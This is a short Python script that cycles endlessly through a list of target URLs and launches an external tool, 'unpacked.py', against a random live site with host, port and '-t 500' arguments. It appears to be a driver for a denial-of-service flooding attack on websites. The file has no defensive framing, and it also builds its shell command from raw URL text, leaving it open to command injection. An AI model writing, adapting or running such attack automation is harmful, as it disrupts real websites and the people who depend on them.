import os
import random
import time
from sys import argv

from working_sites import get_working_sites

if __name__ == '__main__':
    if not argv[1]:
        print("No arguments specified!")
        exit(1)

    urls = open(argv[1], 'r', encoding='utf-8').readlines()

    while True:
        sites_available = get_working_sites(urls.copy())
        if len(sites_available) > 0:
            target = random.choice(sites_available)
            command = f'python unpacked.py -s {target.replace("https:", "").replace("http:", "").replace("/", "")}' \
                      + f' -p {"443" if target.startswith("https") else "80"} -t 500'
            print(command)
            os.system(command)
        else:
            print("No sites available. Waiting 30 seconds.")
            time.sleep(30)
